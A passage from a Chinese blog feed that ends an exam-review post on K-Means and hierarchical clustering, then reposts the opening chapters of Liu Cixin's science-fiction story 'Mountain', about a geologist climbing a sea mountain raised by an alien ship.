<h4 id="题型2-K-Means方法聚类"><a href="#题型2-K-Means方法聚类" class="headerlink" title="题型2 K-Means方法聚类"></a>题型2 K-Means方法聚类</h4><p><strong>问： 采用K-平均点方法对该数据集（见题型1）进行聚类，其中K&#x3D;3，起始中心点ID&#x3D;1，ID&#x3D;2，ID&#x3D;3，即，(3,5)；(2,6)；(3,8)。（2012）</strong></p>
<blockquote>
<p>K-means聚类流程：</p>
<ol>
<li><p>随机选择k个起始中心点；</p>
</li>
<li><p>计算每个数据点到每个中心点的距离，然后将数据点分配到距离最近的中心点，最终分成k类；</p>
</li>
<li><p>在每一个类中，计算其中数据的均值，作为新的中心点；</p>
</li>
<li><p>重复2-3步，直到聚类不再发生变化。</p>
</li>
</ol>
</blockquote>
<p>答：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8d9e710a-ce22-4960-93e8-5fdb495b8039.png" alt="8d9e710a-ce22-4960-93e8-5fdb495b8039"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/cffa8b86-01cb-491b-bbfb-22f6211891a4.png" alt="cffa8b86-01cb-491b-bbfb-22f6211891a4"></p>
<h4 id="题型3-凝聚式层次式方法聚类"><a href="#题型3-凝聚式层次式方法聚类" class="headerlink" title="题型3 凝聚式层次式方法聚类"></a>题型3 凝聚式层次式方法聚类</h4><p><strong>问：采用凝聚式层次式方法对数据集进行聚类，聚类间的距离使用聚类中数据的平均曼哈顿距离进行度量。（2013）</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231152833735.png" alt="image-20241231152833735"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231151904032.png" alt="image-20241231151904032"></p>
<p>省流：两个簇之间的平均距离计算方法为，将两个簇中的数据点的距离两两相加，求得总和后除以两个簇的大小。</p>
<blockquote>
<p>凝聚式层次式聚类流程：</p>
<ol>
<li><p>将每个数据点看作一个独立的簇，即一开始有n个簇；</p>
</li>
<li><p>计算每个簇之间的距离；</p>
</li>
<li><p>合并最相似的两个簇；</p>
</li>
<li><p>重复2-3步，直到所有数据点合并为一个单一的簇。</p>
</li>
</ol>
<p>在这个过程中，可以使用树状图来表示簇的合并过程。</p>
</blockquote>
<p>答：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241231154042104.png" alt="image-20241231154042104" style="zoom:50%;" />

<p><strong>问：采用凝聚式层次式方法对数据集进行聚类，聚类间的距离使用聚类中数据之间的最大距离进行度量。（2014、2015）</strong></p>
<blockquote>
<p>聚类中数据之间的最大距离，即两个簇之间最远的两个点之间的距离。</p>
</blockquote>
<p>答：</p>
<p>过程类似，用最大距离替换平均距离进行计算即可。</p>
<h3 id="2024回忆"><a href="#2024回忆" class="headerlink" title="2024回忆"></a>2024回忆</h3><ol>
<li>基于保险公司背景，分析数据立方体、多维多层次概念，OLAP基本操作；<strong>OLAP与特征规则挖掘的联系与区别</strong>。</li>
<li>DOG集与CAT集计算信息增益；</li>
<li>Apriori算法求频繁集；构造关联规则。</li>
<li>等宽分桶；朴素贝叶斯。</li>
<li>曼哈顿距离相异矩阵；<strong>K-中间点算法（不是K-Means！！！）</strong>。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://zhuanlan.zhihu.com/p/677631759">南京大学软件学院-2023-数据仓库（研究生）期末复习参考 - 知乎</a></li>
<li>数据仓库与数据挖掘（第二版）</li>
<li>2012-2015往年卷</li>
</ol>
]]></content>
      <categories>
        <category>数据仓库与知识发现</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>数据仓库与知识发现</tag>
      </tags>
  </entry>
  <entry>
    <title>《山》——刘慈欣</title>
    <url>/2024/12/23/%E5%B1%B1/</url>
    <content><![CDATA[<h3 id="一、山在那儿"><a href="#一、山在那儿" class="headerlink" title="一、山在那儿"></a>一、山在那儿</h3><p>　　“我今天一定要搞清楚你这个怪癖：为什么从不上岸?”船长对冯帆说，“五年了，我都记不清蓝水号停泊过多少个国家的多少个港口了，可你从没上过岸。如果蓝水号退役了，你是不是也打算像电影的主人公那样随它沉下去?”</p>
<p>　　“我会换条船，海洋考察船总是欢迎我这种不上岸的地质工程师的。”</p>
<p>　　“是陆地上有什么东西让你害怕吧?”</p>
<p>　　“相反，陆地上有东西让我向往。”</p>
<p>　　“什么东西?”</p>
<p>　　“山。”</p>
<span id="more"></span>

<p>　　他们现在站在蓝水号海洋地质考察船的左舷，看着赤道上的太平洋。一年前蓝水号第一次过赤道时，船上还娱乐性地举行了那个古老的仪式，但随着这片海底锰结核沉积区的发现，蓝水号在一年中反复穿越赤道无数次，他们已经忘了赤道的存在。</p>
<p>　　现在，夕阳已沉到了海平线下，太平洋异常地平静，冯帆从未见过平静的海面，这让他想起了那些喜马拉雅山上的湖泊，清澈得发黑，像地球的眸子。一次，他和两个队员偷看湖里的藏族姑娘洗澡，被几个牧羊汉子拎着腰刀追，后来追不上，就用石抛子朝他们抡石头，贼准，他们只好做投降状站下，那几个汉子走近打量了他们一阵儿就走了，冯帆听懂了他们嘀咕的那几句藏语：还没见过外面来的人能在这地方跑这么快。</p>
<p>　　“喜欢山?那你是山里长大的了。”船长说。</p>
<p>　　“不，”冯帆说，“山里长大的人一般都不喜欢山，他们总是感觉山把自己与世界隔绝开来。我认识一个尼泊尔夏尔巴族登山向导，他登了四十一次珠峰，但每一次都在距峰顶不远处停下，看着雇用他的登山队登顶，他说只要自己愿意，无论从北坡还是南坡，都可以在十个小时内登上珠峰，但他没有兴趣。山的魅力是从两个方位感受到的：一是从平原上远远地看山，再就是站在山顶上。</p>
<p>　　“我的家在河北大平原上，向西能看到太行山。家和山之间就像这海似的一马平川，没遮没挡。我生下来不久，妈第一次把我抱到外面，那时我脖子刚硬得能撑住小脑袋，就冲着西边的山伊伊呀呀地叫。学走路时，总是摇摇晃晃地朝山那边走。大一些后，曾在一天清晨出发，沿着石太铁路向山走，一直走到中午肚子饿了才回头，但那山看上去还是那么远。上学后还骑着自行车向山走，那山似乎随着我向后退，丝毫没有近些的感觉。时间长了，远山对于我已成为一种象征，像我们生活中那些清晰可见但永远无法到达的东西，那是凝固在远方的梦。”</p>
<p>　　“我去过那一带。”船长摇摇头说，“那里的山很荒，上面只有乱石和野草，所以你以后注定要面临一次失望。”</p>
<p>　　“不，我和你想的不一样，我只想爬上去，并不指望得到山里的什么东西。第一次登上山顶时，看着抚育我长大的平原在下面延展，真有一种新生的感觉。”</p>
<p>　　冯帆说到这里，发现船长并没有专注于他们的谈话，他仰头看天，那里，已出现了稀疏的星星，“那儿，”船长用烟斗指着正上方天顶的一处说，“那儿不应该有星星。”</p>
<p>　　但那里有一颗星星，很暗淡，丝毫不引人注意。</p>
<p>　　“你肯定?”冯帆将目光从天顶转向船长，“GPS早就代替了六分仪，你肯定自己还是那么熟悉星空?”</p>
<p>　　“那当然，这是航海专业的基础知识……你接着说。”</p>
<p>　　冯帆点点头：“后来在大学里，我组织了一支登山队，登过几座7000米以上的高山，最后登的是珠峰。”</p>
<p>　　船长打置着冯帆：“我猜对了，果然是你！我一直觉得你面熟，改名了?”</p>
<p>　　“是的，我曾叫冯华北。”</p>
<p>　　“几年前你可引起不小的关注啊，媒体上说的那些都是真的?”</p>
<p>　　“基本上是吧，反正那四个大学登山队员确实是因我而死的。”</p>
<p>　　船长划了根火柴，将熄灭的烟斗重新点着，”我感觉，做登山队长和做远洋船长有一点是相同的：最难的不是学会争取，而是学会放弃。”</p>
<p>　　“可我当时要是放弃了，以后也很难再有机会。你知道登山运动是一件很花钱的事，我们是一支大学生登山队，好不容易争取到赞助……由于我们雇的登山协同和向导闹罢工，在建一号营地时耽误了时间，然后就预报有风暴，但从云图上看，风暴到这儿至少还有二十个小时的时间，我们这时已经建好了7900米的二号营地，立刻登顶时间应该够了。你说我这时能放弃吗?“ “那颗星星在变亮。”船长又抬头看了看。</p>
<p>　　“是啊，天黑了嘛。”</p>
<p>　　“好像不是因为天黑……说下去。”</p>
<p>　　“后面的事你应该都知道：风暴来时，我们正在海拔8680米到8710米最险的一段上，那是一道接近90度的峭壁，登山界管它叫第二台阶中国梯。当时峰顶已经很近了，天还很晴，只在峰顶的一侧雾化出一缕云，我清楚地记得，当时觉得珠峰像一把锋利的刀子，把天划破了，流出那缕白血……很快一切都看不见了，风暴刮起的雪雾那个密啊，一下子就把那四名队员从悬崖上吹下去了，只有我死死拉着绳索。可我的登山镐当时只是卡在冰缝里，根本不可能支撑五个人的重量，也就是出于本能吧，我割断了登山索上的钢扣，任他们掉下去……其中两个人的遗体现在还没找到。”“这是五个人死还是四个人死的问题。”</p>
<p>　　“是，从登山运动紧急避险的准则来说，我也没错，但就此背上了这辈子的一个十字架……</p>
<p>　　你说得对，那颗星星不正常，还在变亮。”</p>
<p>　　“别管它……那你现在的这种……状况，与这次经历有关吗?“ “还用说吗?你也知道当时媒体上铺天盖地的谴责和鄙夷，说我不负责任，说我是个自私怕死的小人，为自己活命牺牲了四个同伴……我至少可以部分澄清后一种指责，于是那天我穿上那件登山服，戴上太阳镜，顺着排水管登上了学院图书馆的顶层。就在我跳下去前，导师上来了，他在我后面说：你这么做是不是太轻饶自己了?你这是在逃避更重的惩罚。我问他有那种惩罚吗?他说当然有，你找一个离山最远的地方过一辈子，让自己永远看不见山，这不就行了?于是我就没有跳下去。这当然招来了更多的耻笑，但只有我自己知道导师说得对，那对我真的是一个比死更重的惩罚。我视登山为生命，学地质也是为的这个，让我一辈子永远离开自己痴迷的高山，再加上良心的折磨，很合适。</p>
<p>　　于是我毕业后就找到了这个工作，成为蓝水号考察船的海洋地质工程师，来到海上——离山最远的地方。” 船长盯着冯帆看了好半天，不知该说什么好，终于认定最好的选择是摆脱这人，好在现在头顶上的天空中就有一个转移话题的目标：“再看看那颗星星。“ “天啊，它好像在显出形状来！”冯帆抬头看后惊叫道。那颗星已不是一个点，而是一个小小的圆形，那圆形在很快扩大，转眼间成了天空中一个醒目的发着蓝光的小球。</p>
<p>　　一阵急促的脚步声把他们的目光从空中拉回了甲板，头上戴着耳机的大副急匆匆地跑来，对船长说：“收到消息，有一艘外星飞船正在向地球飞来，我们所处的赤道位置看得最清楚，看，就是那个！”</p>
<p>　　三人抬头仰望，天空中的小球仍在急剧膨胀，像吹了气似的，很快胀到满月大小。</p>
<p>　　所有的电台都中断了正常播音在说这事儿呢！那个东西早被观测到了，现在才证实它是什么，它不回答任何询问，但从运行轨道看，它肯定足有巨大动力的，正在高速向地球扑过来！他们说那东西有月球大小呢！”现在看，那个太空中的球体已远不止月亮大小了，它的内部现在可以装下十个月亮，占据了天空相当大的一部分，这说明它比月球距地球要近得多。大副捂着耳机接着说：“他们说它停下了，正好停在三万六千公里高的同步轨道上，成了地球的一颗同步卫星！“ “同步卫星?就是说它悬在那里不动了?！”</p>
<p>　　“是的，在赤道上，正在我们上方！”</p>
<p>　　冯帆凝视着太空中的球体，它似乎是透明的，内部充盈着蓝幽幽的光，真奇怪，他竟有种盯着海面看的感觉，每当海底取样器升上来之前，海呈现出来的那种深邃都让他着迷，现在，那个蓝色巨球的内部就是这样深不可测，像是地球海洋在远古丢失的一部分正在回归。</p>
<p>　　“看啊，海！海怎么了?！“船长首先将目光从具有催眠般魔力的巨球上挣脱出来，用烟斗指着海面惊叫。</p>
<p>　　前方的海天连线开始弯曲，变成了一条向上拱起的正弦曲线。海面隆起了一个巨大的水包，这水包急剧升高，像是被来自太空的一只无形的巨手提了起来。</p>
<p>　　“是飞船质量的引力！它在拉起海水！”冯帆说，他很惊奇自己这时还能进行有效的思考。飞船的质量相当于月球，而它与地球的距离仅是月球的十分之一！幸亏它静止在同步轨道上，引力托起的海水也是静止的，否则滔天的潮汐将毁灭世界。</p>
<p>　　现在，水包已升到了顶天立地的高度，呈巨大的秃锥形，它的表面反射着空中巨球的蓝光，而落日暗红的光芒又用艳丽的血红勾勒出它的边缘。水包的顶端在寒冷的高空雾化出了一缕云雾，那云飘出不远就消失了，仿佛是傍晚的天空被划破了似的。这景象令冯帆心里一动，他想起了……</p>
<p>　　“测测它的高度！”船长喊道。</p>
<p>　　过了一分钟有人喊道：“大约9100米！”</p>
<p>　　在这地球上有史以来最恐怖也是最壮美的奇观面前，所有人都像被咒语定住了。“这是命运啊……“冯帆梦呓般地说。</p>
<p>　　“你说什么?！”船长大声问，目光仍被固定在水包上。</p>
<p>　　“我说这是命运。”</p>
<p>　　是的，是命运，为逃避山，冯帆来到太平洋中，而就在这距山最远的地方，出现了一座比珠穆朗玛峰还高二百米的水山，现在，它是地球上最高的山。</p>
<p>　　“左舵五，前进四！我们还是快逃命吧！”船长对大副说。</p>
<p>　　“逃命?有危险吗?”冯帆不解地问。</p>
<p>　　“外星飞船的引力已经造成了一个巨大的低气压区，大气旋正在形成，我告诉你吧，这可能是有史以来最大的风暴，说不定能把蓝水号像树叶似的刮上天！但愿我们能在气旋形成前逃出去。”大副示意大家安静，捂着耳机听了一会儿，说：“船长，事情比你想的更糟！电台上说，外星人是来毁灭地球的，他们仅凭着飞船巨大的质量就能做到这一点！飞船引力产生的不是普通的大风暴，而是地球大气的大泄漏！“ “泄漏?向什么地方泄漏?”</p>
<p>　　“飞船的引力会在地球的大气层上拉出一个洞，就像扎破气球一样，空气会从那个洞中逃逸到太空中去，地球大气会跑光的！””这需要多长时间?”船长问。</p>
<p>　　“专家们说，只需一个星期左右，全球的大气压就会降到致命的低限。他们还说，当气压降到一定程度时，海洋会沸腾起来，天啊，那是什么样子啊……现在各国的大城市都陷人混乱，人们一片疯狂，都拥进医院和工厂抢劫氧气……呵，还说，英国卡纳维拉尔角的航天发射基地都有疯狂的人群拥入，他们想抢作为火箭发射燃料的液氧……”</p>
<p>　　“一个星期?就是说我们连回家的时间都不够了。“船长说，摸出火柴再次点燃熄灭的烟斗。</p>
<p>　　“是啊，回家的时间都不够了……”大副茫然地说。</p>
<p>　　“要这样，我们还不如分头去做自己最想做的事。”冯帆说，他突然兴奋起来，感到热血沸腾。</p>
<p>　　“你想做什么?“船长问。</p>
<p>　　“登山。”“登山?登……这座山?！”大副指着海水高山吃惊地问。</p>
<p>　　“是的，现在它是世界最高峰了，山在那儿了，当然得有人去登。”</p>
<p>　　“怎么登?“ “登山当然是徒步的——游泳。“ “你疯了?！“大副喊道，“你能游上九公里高的水坡?那坡看上去有四十五度！那和登山不一样，你必须不停地游动，一松劲就滑下来了！”</p>
<p>　　“我想试试。“ “让他去吧。”船长说，“如果我们在这个时候还不能照自己的愿望生活，那什么时候能行呢?这里离水山的山脚有多远?“ “二十公里吧。”</p>
<p>　　“你开一艘救生艇去吧，“船长对冯帆说，“记住多带些食品和水。“ “谢谢！”</p>
<p>　　“其实你挺幸运的。“船长拍拍冯帆的肩说。</p>
<p>　　“我也这么想。“冯帆说，“船长，还有一件事我没告诉你，在珠峰遇难的那四名大学登山队员中，有我的恋人。当我割断登山索时，脑子里闪过的念头是这样的：我不能死，还有别的山呢。“船长点点头，“去吧。“ “那……我们怎么办呢?“大副问。</p>
<p>　　“全速冲出正在形成的风暴，多活一天算一天吧。“冯帆站在救生艇上，目送着蓝水号远去，他原准备在其上度过一生的。</p>
<p>　　另一边，在太空中的巨球下面，海水高山静静地耸立着，仿佛亿万年来它一直就在那儿。 </p>
<p>　　海面仍然很平静，波澜不惊，但冯帆感觉到了风在缓缓增强，空气已经开始向海山的低气压区聚集了。救生艇上有一面小帆，冯帆升起了它，风虽然不大，但方向正对着海山，小艇平稳地向山脚驶去。随着风力的加强，帆渐渐鼓满，小艇的速度很快增加，艇首像一把利刃划开海水，到山脚的二十公里路程只走了四十分钟。当感觉到救生艇的甲板在水坡上倾斜时，冯帆纵身一跃，跳入被外星飞船的光芒照得蓝幽幽的海中。</p>
<p>　　他成为第一个游泳登山的人。</p>
<p>　　现在，已经看不到海山的山顶，冯帆在水中抬头望去，展现在他面前的，是一面一望无际的海水大坡，坡度有四十五度，仿佛是一个巨人把海洋的另一半在他面前掀起来一样。</p>
<p>　　冯帆用最省力的蛙式游着，想起了大副的话。</p>
<p>　　他大概算了一下，从这里到顶峰有十三公里左右，如果是在海平面，他的体力游出这么远是不成问题的，但现在是在爬坡，不进则退，登上顶峰几乎是不可能的，但冯帆不后悔这次努力，能攀登海水珠峰，本身已是自己登山梦想的一个超值满足了。</p>
<p>　　这时，冯帆有某种异样的感觉。他已明显地感到了海山的坡度在增加，身体越来越随着水面向上倾斜，游起来却没有感到更费力。回头一看，看到了被自己丢弃在山脚的救生艇，他离艇之前已经落下了帆，此刻却见小艇仍然稳稳地停在水坡上，没有滑下去。他试着停止了游动，仔细观察着周围，发现自己也没有下滑，而是稳稳地浮在倾斜的水坡上！冯帆一砸脑袋，骂自己和大副都是白痴：既然水坡上呈流体状态的海水不会下滑，上面的人和船怎么会滑下去呢?现在冯帆知道，海水高山是他的了。</p>
<p>　　冯帆继续向上游，越来越感到轻松，主要是头部出水换气的动作能够轻易完成，这是因为他的身体变轻的缘故。重力减小的其他迹象也开始显现出来，冯帆游泳时溅起的水花下落的速度变慢了，水坡上海浪起伏和行进的速度也在变慢，这时大海阳刚的一面消失了，呈现出了正常重力下不可能有的轻柔。</p>
<p>　　随着风力的增大，水坡上开始出现排浪，在低重力下，海浪的高度增加了许多，形状也发生了变化，变得薄如蝉翼，在缓慢的下落中自身翻卷起来，像一把无形的巨刨在海面上推出的一卷卷玲珑剔透的刨花。海浪并没有增加冯帆游泳的难度，浪的行进方向是向着峰顶的，推送着他向上攀游。随着重力的进一步减小，更美妙的事情发生了：薄薄的海浪不再是推送冯帆，而是将他轻轻地抛起来，有一瞬间他的身体完全离开了水面，旋即被前面的海浪接住，再抛出，他就这样被一只只轻柔而有力的海之手传递着，快速向峰顶进发。他发现，这时用蝶泳的姿势效率最高。</p>
<p>　　风继续增强，重力继续减小，水坡上的浪已超过了十米，但起伏的速度更慢了。由于低重力下水之间的磨擦并不剧烈，这样的巨浪居然不发出声音，只能听到风声。身体越来越轻盈的冯帆从一个浪峰跃向另一个浪峰，他突然发现，现在自己腾空的时间已大于在水中的时间，不知道自己是在游泳还是在飞翔。有几次，薄薄的巨浪把他盖住了，他发现自己进入了一个由翻滚卷曲的水膜卷成的隧道中，在他的上方，薄薄的浪膜缓缓卷动，浸透了巨球的篮光。透过浪膜，可以看到太空中的外星飞船，巨球在浪膜后变形抖动，像是用泪眼看去一般。</p>
<p>　　冯帆看看左腕上的防水表，他已经”攀登”了一个小时，照这样出人意料的速度，最多再有这么长时间就能登项了。</p>
<p>　　冯帆突然想到了蓝水号，照目前风力增长的速度看，大气旋很快就要形成，蓝水号无论如何也逃不出超级风暴了。他突然意识到船长犯了一个致命的错误：应该将船径直驶向海水高山，既然水坡上的重力分量不存在，蓝水号登上顶峰如同在平海上行驶一样轻而易举，而峰顶就是风暴眼，是平静的！想到这里，冯帆急忙掏出救生衣上的步话机，但没人回答他的呼叫。</p>
<p>　　冯帆已经掌握了在浪尖飞跃的技术，他从一个浪峰跃向另一个浪峰，又“攀登”了二十分钟左右，已经走过了三分之二的路程，浑圆的峰顶看上去不远了，它在外星飞船撒下的光芒中柔和地闪亮，像是等待着他的一个新的星球。这时，呼呼的风声突然变成了恐怖的尖啸，这声音来自所有方向。风力骤然增大，二三十米高的薄浪还没来得及落下，就在半空中被飓风撕碎，冯帆举目望去，水坡上布满了被撕碎的浪峰，像一片在风中狂舞的乱发，在巨球的照耀下发出一片炫目的白光。</p>
<p>　　冯帆进行了最后的一次飞跃，他被一道近三十米高的簿浪送上半空，那道浪在他脱离的瞬间就被疾风粉碎了。他向着前方的一排巨浪缓缓下落，那排浪像透明的巨翅缓缓向上张开，似乎也在迎接他。就在冯帆的手与升上来的浪头接触的瞬间，这面晶莹的水晶巨膜在强劲的风中粉碎了，化做一片雪白的水雾，浪膜在粉碎时发出一阵很像是大笑的怪声。与此同时，冯帆已经变得很轻的身体不再下落，而是离癫狂的海面越来越远，像一片羽毛般被狂风吹向空中。</p>
<p>　　冯帆在低重力下的气流中翻滚着，晕眩中，只感到太空中发光的巨球在围绕着他旋转。当他终于能够初步稳住自己的身体时，竟然发现自己在海水高山的顶峰上空盘旋！水山表面的排排巨浪从这个高度看去像一条条长长的曲线，这些曲线标示出旋风呈螺旋状汇聚在山顶。冯帆在空中盘旋的圈子越来越小，速度越来越快，他正在被吹向气旋的中心。</p>
<p>　　当冯帆飘进风暴眼时，风力突然减小，托着他的无形的气流之手松开了，冯帆向着海水高山的峰顶坠下去，在峰顶的正中扎入了蓝幽幽的海水中。</p>
<p>　　冯帆在水中下沉着，过了好一会儿才开始上浮，这时周围已经很暗了。当窒息的恐慌出现时，冯帆突然意识到了他所面临的危险：入水前的最后一口气是在海拔近万米的高空吸人的，含氧量很少，而在低重力下，他在水中的上浮速度很慢，即使是自己努力游动加速，肺中的空气怕也支持不到自己浮上水面。一种熟悉的感觉向他袭来，他仿佛又回到了珠峰的风暴卷起的黑色雪尘中，死亡的恐惧压倒了一切。就在这时，他发现身边有几个银色的圆球正在与自己一同上浮，最大的一个直径有一米左右，冯帆突然明白这些东西是气泡！低重力下的海水中有可能产生很大的气泡。他奋力游向最大的气泡，将头伸过银色的泡壁，立刻能够顾畅地呼吸了！当缺氧的晕眩缓过去后，他发现自己置身于一个球形的空间中，这是他再一次进入由水围成的空间。透过气泡圆形的顶部，可以看到变形的海面波光粼粼。在上浮中，随着水压的减小，气泡在迅速增大，冯帆头顶的圆形空间开阔起来，他感觉自己是在乘着一个水晶气球升上天空。上方的蓝色波光越来越亮，最后到了刺眼的程度，随着 “啪“地一声轻响，大气泡破裂，冯帆升上了海面。在低重力下他冲上了水面近一米高，再缓缓落下来。 </p>
<p>　　冯帆首先看到的是周围无数缓缓飘落的美丽水球。水球大小不一，最大的有足球大小，这些水球映射着空中巨球的蓝光，细看内部还分着许多球层，显得晶莹剔透。这都是冯帆落到水面时溅起的水，在低重力下，由于表面张力而形成球状，他伸手接住一个，水球破碎时发出一种根本不可能是水所发出的清脆的金属声。</p>
<p>　　海山的峰顶十分平静，来自各个方向的浪在这里互相抵消，只留下一片碎波。这里显然是风暴的中心，是这狂躁的世界中惟一平静的地方。这平静以另一种洪大的轰鸣声为背景，那就是旋风的呼啸声。冯帆抬头望去，发现自己和海山都处于一口巨井中，巨井的壁整是由气旋卷起的水雾构成的，这浓密的水雾在海山周围缓缓旋转着，一直延仲到高空。巨井的井口就是外星飞船，它像太空中的一盏大灯，将蓝色的光芒投到“井“内。冯帆发现那个巨球周围有一片奇怪的云，那云呈丝状，像一张松散的丝网，它们看上去很亮，像自己会发光似的。</p>
<p>　　冯帆猜测，那可能是泄漏到太空中的大气所产生的冰晶云，它们看上去围绕在外星飞船周围，实际与之相距有三万多公里。要真是这样，地球大气层的泄漏已经开始了，这口由大旋风构成的巨井，就是那个致命的漏洞。</p>
<p>　　不管怎么样，冯帆想，我登顶成功了。</p>
<h3 id="二、顶峰对话"><a href="#二、顶峰对话" class="headerlink" title="二、顶峰对话"></a>二、顶峰对话</h3><p>　　周围的光线突然发生变化，暗了下来，闪烁着，冯帆抬头望去，看到外星飞船发出的蓝光消失了。他这时才明白那蓝光的意义：那只是一个显示屏空屏时的亮光，巨球表面就是一个显示屏。现在，巨球表面出现了一幅图像，图像是从空中俯拍的，是浮在海面上的一个人在抬头仰望，那人就是冯帆自己。半分钟左右，图像消失了，冯帆明白它的含义，外星人只是表示他们看到了自己。这时，冯帆真正感到自己是站在了世界的顶峰上。</p>
<p>　　屏幕上出现了两排单词，各国文字的都有，冯帆只认出了英文的“ENGLISH”，中文的“汉语”和日文的“日本语“，其他的，也显然是用地球上各种文字所标明的相应语种。有一个深色框在各个单词间快速移动，冯帆觉得这景象很熟悉。他的猜测很快得到了证实，他发现深色框的移动竟然是受自己的目光控制的！他将目光固定到”汉语”上，深色框就停在那里，他眨了一下眼，没有任何反应；应该双击，他想着，连眨了两下眼，深色框闪了一下，巨球上的语言选择菜单消失了，出现了一行很大的中文：你好！</p>
<p>　　“你好！！”冯帆向天空大喊，“你能听到我吗?！”能听到，你用不着那么大声，我们连地球上的一只蚊子的声音都能听到。我们从你们行星外泄的电波中学会了这些语言，想同你随便聊聊。</p>
<p>　　“你们从哪里来?”巨球的表面出现了一幅静止的图像，由密密庥麻的黑点构成，复杂的细线把这些黑点连接起来，构成一张令人目眩的大网，这分明是一幅星图。果然，其中的一个黑点发出了银光，越来越亮。冯帆什么也没看懂，但他相信这幅图像肯定已被记录下来，地球上的天文学家们应该能看懂的。巨球上又出现了文字，星图并没有消失，而是成为文字的背景，或说桌面。</p>
<p>　　我们造了一座山，你就登上来了。</p>
<p>　　“我喜欢登山。”冯帆说。</p>
<p>　　这不是喜欢不喜欢的问题，我们必须登山。</p>
<p>　　“为什么?你们的世界有很多山吗?”冯帆问，他知道这显然不是人类目前迫切要谈的话题，但他想谈，既然周围人都认为登山者是傻瓜，他只好与声称必须登山的外星人交流了，他为自己争取到了这一切。</p>
<p>　　山无处不在，只是登法不同。</p>
<p>　　冯帆不知道这句话是哲学比喻还是现实描述，他只能傻傻地回答：”那么你们那里还是有很多山了。”对于我们来说，周围都是山，这山把我们封闭了，我们要挖洞才能登山。</p>
<p>　　这话令冯帆迷惑，他想了半天也没想出是怎么回事。</p>
<h3 id="三、泡世界"><a href="#三、泡世界" class="headerlink" title="三、泡世界"></a>三、泡世界</h3><p>　　外星人继续说：我们的世界十分简单，是一个球形空间，按照你们的长度单位计量，半径约为三千公里。这个空间被岩层所围绕，向任何一个方向走，都会遇到一堵致密的岩壁。</p>
<p>　　我们的第一宇宙模型自然而然地建立起来了：字宙由两部分构成，其一就是我们生存的半径为三千公里的球形空间，其二就是圈绕着这个空间的岩层，这岩层向各个方向无限延伸。所以，我们的世界就是这固体宇宙中的—个空泡，我们称它为泡世界。这个宇宙理论被称为密实宇宙论。当然，这个理论不排除这样的可能：在无限的岩层中还有其他的空泡，离我们或近或远，这就成了以后探索的动力。</p>
<p>　　“可是，无限厚的岩层是不可能存在的，会在引力下塌缩的。”我们那时不知道万有引力这回事，泡世界中没有重力，我们生活在失重状态中。真正意识到引力的存在是几万年以后的事了。</p>
<p>　　“那这些空泡就相当于固体宇宙中的星球了?真有趣，你们的宇宙在密度分布上与真实的正好相反，像是真实宇宙的底片啊。”真实的宇宙?这话很浅薄，只能说是现在已知的宇宙。你们并不知道真实的宇宙是什么样子，我们也不知道。</p>
<p>　　“那里有阳光、空气和水吗?”都没有，我们也都不需要。我们的世界中只有固体，没有气体和液体。</p>
<p>　　“没有气体和液体，怎么会有生命呢?”我们是机械生命，肌肉和骨骼由金属构成，大脑是超高集成度的芯片，电流和磁场就是我们的血液，我们以地核中的放射性岩块为食物，靠它提供的能量生存。没有谁制造我们，这一切都是自然进化而来，由最简单的单细胞机械，由放射性作用下的岩石上偶然形成的PN结进化而来。我们的原始祖先首先发现和使用的是电磁能，至于你们意义上的火，从来就没有发现过。</p>
<p>　　“那里一定很黑吧。”</p>
<p>　　亮光倒是有一些，是放射性物质在地核的内壁上产生的，那内壁就是我们的天空了。光很弱，在岩壁上游移不定，但我们也由此进化出了眼睛。地核中是失重的，我们的城市就悬浮在那昏暗的空间中，它们的大小与你们的城市差不多，远看去，像一团团发光的云。机械生命的进化时间比你们碳基生命要长得多，但我们殊途同归，都走到了对宇宙进行思考的那一天。</p>
<p>　　“不过，这个宇宙可真够憋屈的。”憋……这是个新词汇。所以，我们对广阔空间的向往比你们要强烈，早在泡世界的上古时代，向岩层深处的探险就开始了，探险者们在岩层中挖隧道前进，试图发现固体字宙中的其他空泡。</p>
<p>　　关于这些想像中的空泡，有着很多奇丽的神话，对远方其他空泡的幻想构成了泡世界文学的主体。但这种探索最初是被禁止的，违者将被短路处死。</p>
<p>　　“是被教会禁止的吗?”不，没什么教会，一个看不到太阳和星空的文明是产生不了宗教的。元老院禁止隧洞探险是出于很现实的理由：我们没有你们近乎无限的空间，我们的生存空间半径只有3000公里。隧洞挖出的碎岩会在地核中堆积起来，由于相信有无限厚的岩层，那么隧洞就可能挖得很长，最终挖出的碎岩会把地核空间填满的！换句话说，是把地核的球形空间转换成长长的隧洞空间。 </p>
<p>　　“好像有—个解决办法：把挖出的碎岩放到后面已经挖好的隧洞中，只留下供探险者们容身的空间就行了。”</p>
<p>　　后来的探险确实就是这么进行的，探险者们容身的空间其实就是一个移动的小空泡，我们把它叫做泡船。但即使这样，仍然有相当于泡船空间的一堆碎石进入地核空间，只有等待泡船返回时这堆碎石才能重新填回岩壁，如果泡船有去无回，那么这小堆碎石占据的地核空间就无法恢复，就相当于这一小块空间被泡船偷走了，所以探险者们又被称为空间窃贼。对于那个狭小的世界，这么一点点空间也是宝贵的，天长日久，随着一艘艘泡船的离去，被占据的空间也很巨大。所以泡船探险在远古时代也是被禁止的。同时，泡船探险是一项十分艰险的活动，一般的泡船中都有若干名挖掘手和一名领航员，那时还没有掘进机，只能靠挖掘手(相当于你们船上的桨手)使用简单的工具不停地挖掘，泡船才能在岩层中以极其缓慢的速度前进。</p>
<p>　　在一个刚能容身的小小空洞里机器般劳作，在幽闭中追寻着渺茫的希望，无疑需要巨大的精神力量。</p>
<p>　　由于泡船的返回一般是沿着已经挖松的来路，所以相对容易些，但赌徒般的发现欲望往往会驱使探险者越过安全的折返点，继续向前，这时，返回的体力和给养都不够了，泡船就会搁浅在返途中，成为探险者的坟墓。尽管如此，泡世界向外界的探险虽然规模很小，但从未停止过。</p>
